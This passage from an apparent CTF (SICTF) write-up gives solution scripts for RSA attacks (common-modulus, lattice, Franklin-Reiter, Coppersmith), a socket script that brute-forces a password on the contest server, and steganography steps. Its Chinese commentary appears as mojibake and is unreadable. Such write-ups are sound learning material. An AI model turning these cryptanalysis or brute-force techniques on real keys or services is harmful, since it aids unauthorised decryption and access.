class="string">SICTF&#123;0110001111100101&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å‘Šè¯‰æˆ‘çœ‹åˆ°è¿™ç§æŠ½è±¡çš„é¢˜è¦å¤šè°ƒè¯•ï¼Œé™ä¸‹æ¥åˆ†æQAQ</p><h3 id="virus-nlys1s-å¾…è¡¥å……">virus-nlys1s[å¾…è¡¥å……]</h3><p>å±…ç„¶æ˜¯ç—…æ¯’æ ·æœ¬ï¼Œæ²¡ç©è¿‡ï¼Œä¹‹åå†è¯´</p><hr><h2 id="CRYPTO">CRYPTO</h2><h3 id="vigenere">vigenere</h3><p>ä»åå­—å¯ä»¥çœ‹å‡ºæ˜¯ç»´å‰å°¼äºšå¯†ç </p><p>ç¬¬äºŒæ®µå¯ä»¥æ˜æ˜¾çœ‹å‡ºæœ‰ä¸€æ®µæ˜¯SICTF{}ï¼Œè¿›å…¥</p><p><a href="https://www.dcode.fr/vigenere-cipher%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E8%BE%93%E5%85%A5%E5%AF%86%E6%96%87%E5%92%8C%E5%B7%B2%E7%9F%A5%E7%9A%84%E6%98%8E%E6%96%87">https://www.dcode.fr/vigenere-cipherè¿™ä¸ªç½‘ç«™ï¼Œè¾“å…¥å¯†æ–‡å’Œå·²çŸ¥çš„æ˜æ–‡</a></p><p>å¾—keyï¼šSAATFå’Œæ˜æ–‡</p><h3 id="SuperbRSA">SuperbRSA</h3><p>è¿™ä¸ªæ˜¯å˜ä½“çš„å…±æ¨¡æ”»å‡»</p><p>é€šè¿‡e1ï¼Œe2æ±‚gcdï¼Œæœ€åçš„ç»“æœè¦å–gcdçš„æ ¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1=<span class="number">55</span></span><br><span class="line">e2=<span class="number">200</span></span><br><span class="line">n= <span class="number">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></span><br><span class="line">c1= <span class="number">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></span><br><span class="line">c2= <span class="number">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></span><br><span class="line"></span><br><span class="line">g,x,y=gmpy2.gcdext(e1,e2)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n)%n</span><br><span class="line">m=gmpy2.iroot(m,g)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;SICTF&#123;S0_Great_RSA_Have_Y0u_Learned?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="easyLattice-å¾…è¡¥å……">easyLattice[å¾…è¡¥å……]</h3><p>æ„Ÿè§‰åœ¨è€ƒé€†å…ƒå’Œæ¨¡çš„åŸºæœ¬è¿ç®—ï¼Ÿä½†æ˜¯æ²¡åšå‡ºæ¥æ‚²ä¼¤ã€‚</p><p>ç¿»wpå‘ç°æ˜¯è€ƒæ ¼å¯†ç ï¼ŒæŒ‰ç…§<a href="https://blog.csdn.net/u010883831/article/details/128262134">VSCodeé…ç½®sageæ•™ç¨‹ ä¸ç”¨notebookç›´æ¥è¿è¡Œ+ä»£ç é«˜äº®+å‘½ä»¤è¡Œè¾“å‡º_sage windows-CSDNåšå®¢</a>å®‰è£…å¥½ç¯å¢ƒï¼Œï¼ˆæœ€åå¤±è´¥äº†ï¼Œäºæ˜¯æŠŠåº“å…¨æ”¾åˆ°è‡ªå¸¦çš„è§£é‡Šå™¨é‡Œé¢ï¼‰</p><p>æ²¡è§è¿‡å‘€ï¼ˆTVTï¼‰ï¼Œçœ‹ä¸æ‡‚ï¼Œä¹‹åå†è¯´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">h = <span class="number">9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443</span></span><br><span class="line">p = <span class="number">11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947</span>     </span><br><span class="line">T = <span class="number">2</span>^<span class="number">250</span></span><br><span class="line"></span><br><span class="line">L = Matrix(ZZ,[[<span class="number">1</span>,T*h],[<span class="number">0</span>,T*p]])</span><br><span class="line"></span><br><span class="line">f,g = L.LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = <span class="built_in">abs</span>(f),<span class="built_in">abs</span>(g)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(f)))</span><br><span class="line"><span class="comment"># SICTF&#123;e3fea01c-18f3-4638-9544-9201393940a9&#125;</span></span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æ˜¯è¯´<br>$$<br>h = (f^{-1}g) \mod p<br>$$</p><p>$$<br>g = fh+kp<br>$$</p><h1>$$<br>\begin{pmatrix}<br>f &amp; k \<br>\end{pmatrix}<br>\times<br>\begin{pmatrix}<br>1 &amp; h \<br>0 &amp; p<br>\end{pmatrix}</h1><p>\begin{pmatrix}<br>f &amp; g \<br>\end{pmatrix}<br>$$</p><h3 id="gggcd-å¾…è¡¥å……">gggcd[å¾…è¡¥å……]</h3><p>è¿™ä¸ªç¬¬ä¸€æ¬¡è§åˆ°è¯¶ï¼Œå¥½æ€ªï¼šåŒeï¼Œnä¸åŒmï¼Œ$m_2=f(m_1)$</p><p>m2æ˜¯m1çš„çº¿æ€§å˜æ¢</p><p>ç„¶åå·²çŸ¥c1ï¼Œc2ï¼Œnï¼Œe</p><p>æŸ¥äº†æŸ¥ï¼ŒåŸæ¥è¿™ä¸ªå«ç›¸å…³æ¶ˆæ¯æ”»å‡»</p><p>é€šè¿‡æ±‚å¯èƒ½çš„gå†æ±‚å…¶gcdï¼ˆg1ï¼Œg2ï¼‰å¾—åˆ°m</p><p>çœ‹å¤§ä½¬ä»¬çš„wpï¼Œexpéƒ½æ˜¯ç”¨sageå†™çš„ï¼Œæˆ‘å®‰è£…å¥½åä¹Ÿä¸èƒ½å¯¼å…¥pythonï¼Œä½†æ˜¯ç›´æ¥ç”¨sageè‡ªå¸¦çš„å¥½åƒå¯ä»¥ï¼Œä¸è¿‡ä¸èƒ½å¯¼å…¥Crypto.Util.numberï¼Œæˆ‘å°±å…ˆè§£å‡ºmå†longtobytes</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">....: c2 = <span class="number">205635624489021368248826364689528951802539834493392269547383991633413</span></span><br><span class="line">....: <span class="number">32272571882209784996486250189912121870946577915881638415484043534161071782</span></span><br><span class="line">....: <span class="number">38735899371291867878739806568899981073418921390469351451959495552246015176</span></span><br><span class="line">....: <span class="number">94795153230498219402854082280557713496709195875609525488767962526341049263</span></span><br><span class="line">....: <span class="number">67078177733076253</span></span><br><span class="line">....: e = <span class="number">65537</span></span><br><span class="line">....: a = <span class="number">233</span></span><br><span class="line">....: b = <span class="number">9527</span></span><br><span class="line">....:</span><br><span class="line">....: <span class="keyword">import</span> binascii</span><br><span class="line">....: <span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2</span>):</span><br><span class="line">....:     PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">....:     g1 = (x)^e - c1</span><br><span class="line">....:     g2 = (<span class="number">233</span>*x+<span class="number">9527</span>)^e - c2</span><br><span class="line">....:</span><br><span class="line">....:     <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">....:         <span class="keyword">while</span> g2:</span><br><span class="line">....:             g1, g2 = g2, g1 % g2</span><br><span class="line">....:         <span class="keyword">return</span> g1.monic()</span><br><span class="line">....:     <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">....:</span><br><span class="line">....: m=franklinReiter(n,e,c1,c2)</span><br><span class="line">....: <span class="built_in">print</span>((m))</span><br><span class="line"><span class="number">11658736990073968144116409270602503966776095409763057826884617698882016691134900406351481309826095854973</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">print</span>(long_to_bytes(<span class="number">11658736990073968144116409270602503966776095409763057826884617698882016691134900406351481309826095854973</span>))</span><br><span class="line"><span class="attribute">b</span>&#x27;SICTF&#123;<span class="number">45115</span>fb2-<span class="number">84</span>d6-<span class="number">4369</span>-<span class="number">88</span>c2-c8c3d72b4c55&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="ç­¾åˆ°ï¼Œç¡®ä¿¡-å¾…è¡¥å……">ç­¾åˆ°ï¼Œç¡®ä¿¡![å¾…è¡¥å……]</h3><p>æˆ‘ä¸è§£ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼</p><h3 id="é“œåŒ -å¾…è¡¥å……">é“œåŒ [å¾…è¡¥å……]</h3><p>ä¼¼ä¹è¿™ä¸ªæ˜¯å·²çŸ¥pçš„é«˜ä½</p><p>ä½†æ˜¯è½¬5è¿›åˆ¶ä¹‹åä¼¼ä¹ä¸èƒ½å‡†ç¡®è¡¨ç¤ºpçš„é«˜ä½ï¼Œéš¾åº¦æ˜¯æŠŠnè½¬5è¿›åˆ¶ï¼Ÿ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> Crypto.Util.number import *</span><br><span class="line"><span class="attribute">import</span> gmpy2</span><br><span class="line"><span class="attribute">from</span> tqdm import *</span><br><span class="line"></span><br><span class="line"><span class="attribute">leak</span> = <span class="string">&quot;2011133132443111302000224204142244403203442000141102312242343143241244243020003333022112141220422134444214010012&quot;</span></span><br><span class="line"><span class="attribute">n</span> = <span class="number">85988668134257353631742597258304937106964673395852009846703777410474172989069717247424903079500594820235304351355706519069516847244761609583338251489134035212061654870087550317540291994559481862615812258493738064606592165529948648774081655902831715928483206013332330998262897765489820121129058926463847702821</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">65537</span></span><br><span class="line"><span class="attribute">c</span> = <span class="number">64708526479058278743788046708923650158905888858865427385501446781738669889375403360886995849554813207230509920789341593771929287415439407977283018525484281064769128358863513387658744063469874845446480637925790150835186431234289848506337341595817156444941964510251032210939739594241869190746437858135599624562</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> five_to_ten(num):</span><br><span class="line">    <span class="attribute">temp</span> = <span class="number">0</span></span><br><span class="line">    <span class="attribute">i</span> = <span class="number">109</span></span><br><span class="line">    <span class="attribute">for</span> j in reversed(num):</span><br><span class="line">        <span class="attribute">temp</span> += int(j) * <span class="number">5</span>**i</span><br><span class="line">        <span class="attribute">i</span> += <span class="number">1</span></span><br><span class="line">    <span class="attribute">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="attribute">leak</span> = five_to_ten(leak)</span><br><span class="line"><span class="attribute">gift</span> = leak &gt;&gt; <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> i in trange(<span class="number">2</span>^<span class="number">8</span>):</span><br><span class="line">    <span class="attribute">ph</span> = gift &lt;&lt; <span class="number">8</span></span><br><span class="line">    <span class="attribute">phigh</span> = ph + i</span><br><span class="line">    <span class="attribute">phigh</span> = phigh &lt;&lt; <span class="number">248</span></span><br><span class="line">    <span class="attribute">R</span>.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="attribute">f</span> = phigh + x</span><br><span class="line">    <span class="attribute">res</span> = f.small_roots(X=<span class="number">2</span>^<span class="number">248</span>, beta=<span class="number">0</span>.<span class="number">4</span>, epsilon=<span class="number">0</span>.<span class="number">01</span>)</span><br><span class="line">    <span class="attribute">if</span> res !=<span class="meta"> []:</span></span><br><span class="line"><span class="meta">        p = phigh + int(res[0])</span></span><br><span class="line"><span class="meta">        q = n // p</span></span><br><span class="line"><span class="meta">        d = gmpy2.invert(e,(p-1)*(q-1))</span></span><br><span class="line"><span class="meta">        m = pow(c,d,n)</span></span><br><span class="line"><span class="meta">        print(f&quot;i = &#123;i&#125;&quot;)</span></span><br><span class="line"><span class="meta">        print(long_to_bytes(int(m)))</span></span><br><span class="line"><span class="meta">        break</span></span><br><span class="line"><span class="meta"></span></span><br></pre></td></tr></table></figure><h3 id="babyRSA-å¾…è¡¥å……">babyRSA[å¾…è¡¥å……]</h3><h3 id="easy-or-baby-RSA-å¾…è¡¥å……">easy_or_baby_RSA[å¾…è¡¥å……]</h3><h3 id="2024-New-Setback-å¾…è¡¥å……">2024_New_Setback[å¾…è¡¥å……]</h3><hr><h2 id="MISC">MISC</h2><h3 id="ç­¾åˆ°">ç­¾åˆ°</h3><p>ç•¥</p><h3 id="geekchallenge">geekchallenge</h3><p>è¿™ä¸ªè¦è¿æ¥ä¸€ä¸ªåœ°å€ï¼Œè¿æ¥åæ˜¯ä¸€ä¸ªçŒœæ•°å­—æ¸¸æˆï¼Œ114ä½ï¼Œä¸€å…±5ç§å­—ç¬¦ï¼Œä¸€å¼€å§‹å°è¯•äº†å¾ˆä¹…ä¸çŸ¥é“ä¸ºä»€ä¹ˆé”™äº†ï¼Œæœ€åå‘ç°å®ƒå»¶è¿Ÿä¸€æ¬¡æ˜¾ç¤ºï¼Œä¸Šä¸€æ¬¡çš„ç»“æœå‡ºç°åœ¨ä¸‹ä¸€æ¬¡åœ¨ï¼Œé‚£ä¹ˆè§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰€æœ‰å¯è§å­—ç¬¦</span></span><br><span class="line">visible_chars = string.printable[:-<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªsocketå¯¹è±¡</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥åˆ°æœåŠ¡å™¨</span></span><br><span class="line">s.connect((<span class="string">&quot;yuanshen.life&quot;</span>, <span class="number">34757</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ª114ä½çš„åˆ—è¡¨ï¼Œåˆå§‹å€¼ä¸ºNone</span></span><br><span class="line">password = [<span class="literal">None</span>] * <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿å­˜ä¸Šä¸€æ¬¡çš„å­—ç¬¦</span></span><br><span class="line">last_char = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¾ªç¯éå†æ‰€æœ‰å¯èƒ½çš„å­—ç¬¦</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> visible_chars:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(v <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> v <span class="keyword">in</span> password):</span><br><span class="line">        <span class="comment"># å°†guessè®¾ä¸ºpasswordå¹¶å°†ç©ºä½å…¨éƒ¨æ”¹ä¸ºchar</span></span><br><span class="line">        guess = <span class="string">&#x27;&#x27;</span>.join([v <span class="keyword">if</span> v <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> char <span class="keyword">for</span> v <span class="keyword">in</span> password]) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># å¦åˆ™ï¼Œguessä¸º114ä¸ªç›¸åŒçš„å­—ç¬¦</span></span><br><span class="line">        guess = char * <span class="number">114</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å‘é€å­—ç¬¦ä¸²åˆ°æœåŠ¡å™¨</span></span><br><span class="line">    s.send(guess.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ¥æ”¶æœåŠ¡å™¨çš„å“åº”</span></span><br><span class="line">    response = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(guess)</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line">    <span class="comment"># å¦‚æœresponseä¸­æœ‰&#x27;1&#x27;ï¼Œå°±æŠŠä¸Šä¸€æ¬¡çš„charæ”¾å…¥passwordä¸­çš„æ¯ä¸€ä¸ªè¿”å›çš„&#x27;1&#x27;çš„ä½ç½®</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> response <span class="keyword">and</span> last_char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> i, bit <span class="keyword">in</span> <span class="built_in">enumerate</span>(response):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(password) <span class="keyword">and</span> bit == <span class="string">&#x27;1&#x27;</span><span class="keyword">and</span> password[i] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                password[i] = last_char</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ›´æ–°ä¸Šä¸€æ¬¡çš„å­—ç¬¦</span></span><br><span class="line">    last_char = char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">filter</span>(<span class="literal">None</span>, password)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    message = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥ä½ è¦å‘é€çš„æ¶ˆæ¯ï¼š\n&quot;</span>)</span><br><span class="line">    message += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    s.send(message.encode())</span><br><span class="line">    response = s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­è¿æ¥</span></span><br><span class="line">s.close()</span><br><span class="line"><span class="comment">#SICTF&#123;18e62b78-c753-407c-9b0f-aa386fb4d6fd&#125;</span></span><br></pre></td></tr></table></figure><h3 id="New-year-s-regret">New_year`s regret</h3><p>ç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæœ‰ç§˜å¯†ï¼Œä½†æ˜¯è¯´äº†æ ¼å¼ï¼šxxxxSICTF</p><p>é‚£å°±æ©ç çˆ†ç ´ï¼šæ ¼å¼æ˜¯???SICTF</p><p>å‡ºæ¥æ˜¯2024SICTF</p><p>è§£å‹å‹ç¼©åŒ…å¾—åˆ°ä¸€ä¸ªtask.pngå’Œoutput.txtï¼ŒåŒæ—¶å‹ç¼©åŒ…æ³¨é‡Šè¡¨ç¤ºå‹ç¼©åŒ…æœ‰é¢å¤–æ•°æ®ï¼Œç”¨010editoræŸ¥çœ‹å¾—ï¼š43637d135333</p><p>task.pngæ˜¯400x400çš„ç±»ä¼¼äºŒç»´ç çš„é»‘ç™½å›¾åƒï¼Œä¸€è¡Œ25ä¸ªæ ¼</p><p>output.txtæ˜¯ä¸€å †0101äºŒè¿›åˆ¶ä¸²ï¼Œ22464ä¸ªå­—ç¬¦åŠ ä¸€ä¸ªæ¢è¡Œç¬¦</p><p>é‚£ä¹ˆå¾ˆæœ‰å¯èƒ½è¦æŠŠoutputè½¬ä¸ºå›¾ç‰‡ï¼Œä½†æ˜¯å¹¶ä¸çŸ¥é“è¦æ€ä¹ˆè½¬æ¢ã€‚</p><p>ç„¶åè¿™é‡Œçš„é¢å¤–æ•°æ®43637d135333å®åœ¨æƒ³ä¸å‡ºæ¥æ˜¯ä»€ä¹ˆæ„æ€ï¼Œçœ‹wpåæ‰çŸ¥é“è¦åè½¬ä¹‹åfrom hexï¼š351Ã—64åˆšå¥½22464</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image_from_file</span>(<span class="params">filename, width, height</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    pixels = img.load()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">        row = i // width</span><br><span class="line">        col = i % width</span><br><span class="line">        <span class="keyword">if</span> data[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            pixels[col, row] = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)  </span><br><span class="line">        <span class="keyword">elif</span> data[i] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pixels[col, row] = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)  </span><br><span class="line"></span><br><span class="line">    img.save(<span class="string">&#x27;output.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create_image_from_file(<span class="string">&#x27;output.txt&#x27;</span>,<span class="number">351</span>,<span class="number">64</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/21/GcEh8Qu1xPMSW3o.png" alt="output"></p><p>å¾—åˆ°ä¸€å¼ äº”çº¿è°±ï¼Œè¿™ä¸ªå«Music Sheet Cipher</p><p>é€šè¿‡ç½‘ç«™ï¼š<a href="https://www.dcode.fr/music-sheet-cipher">Music Sheet Cipher - Online Notes Decoder, Encoder, Translator (dcode.fr)</a></p><p>æ¥è§£ç </p><p>å¾—åˆ°ï¼šPUTITALLTOGETHER/put_it_all_together</p><p>ä»¥zipå½¢å¼æ‰“å¼€task.png</p><p>å‘ç°æœ‰base64ç¼–ç çš„å­—ç¬¦,è§£ç åå¥½åƒè¿˜æ˜¯base64ï¼Œå¤šè¯•å‡ æ¬¡ï¼Œæœ€åå‘ç°35æ¬¡çš„æ—¶å€™æœ‰PNGçš„æ ‡å¿—ï¼Œ37æ¬¡å°±ä¸èƒ½ç»§ç»­äº†ï¼ŒæŠŠå®ƒè¾“å‡ºæˆpngï¼Œæ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ç ç„¶åè·å¾—éƒ¨åˆ†flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>):</span><br><span class="line">    data = base64.b64decode(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;something.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(data)</span><br></pre></td></tr></table></figure><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;Congratuation_to_you!</span><br></pre></td></tr></table></figure><p>å†æŸ¥çœ‹task.png,äºŒè¿›åˆ¶æ‰“å¼€çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ ‡å¿—ï¼Œé™¤äº†50 4B 03 04è¿˜æœ‰ä¸€ä¸ªPNGï¼Œå¤åˆ¶PNGä¿å­˜æ‰“å¼€æ˜¯ä¸€å¼ æ­¦å™¨è¡¨ï¼Œæ ¹æ®æç¤ºï¼šä½ çŸ¥é“è¿™æ˜¯å‡ æ˜Ÿå—æƒ³åˆ°è¦æ‰¾æ­¦å™¨æ˜Ÿçº§</p><p><img src="https://s2.loli.net/2024/02/21/EATqRXUfzZDg5F4.png" alt="k"></p><figure 